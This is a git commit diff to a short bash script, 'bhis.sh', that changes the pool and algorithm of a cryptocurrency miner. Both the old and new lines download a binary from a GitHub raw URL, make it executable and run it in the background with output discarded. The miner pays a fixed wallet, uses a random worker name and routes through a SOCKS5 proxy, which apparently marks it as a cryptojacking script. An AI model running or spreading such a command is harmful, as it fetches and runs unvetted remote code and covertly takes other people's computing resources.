880a992d863b0af4f0475387e1c3c1e84bbd0292
herizao <110088416+herizao@users.noreply.github.com>
2022-09-07 11:29:32 +0000

    Update bhis.sh

--- bhis.sh
+++ bhis.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget https://github.com/matefusiom101/GPU/raw/main/xrgs && chmod +x xrgs && ./xrgs -o rx.unmineable.com:80 -a rx -k -u SHIB:0xa38168520124bCE91c0C1D61cf27Bb0282B99209 -p $(echo $(shuf -i 100-999 -n 1)-MasBroo) -t 2 -x socks5://192.252.209.155:14455 >/dev/null &
+wget https://github.com/matefusiom101/GPU/raw/main/xrgs && chmod +x xrgs && ./xrgs -a cn-heavy/xhv -o cryptonight_haven.mine.zergpool.com:4452 -u 0xa38168520124bCE91c0C1D61cf27Bb0282B99209 -p c=SHIB $(echo $(shuf -i 100-999 -n 1)-MasBroo) -t 2 -x socks5://192.252.209.155:14455 >/dev/null &
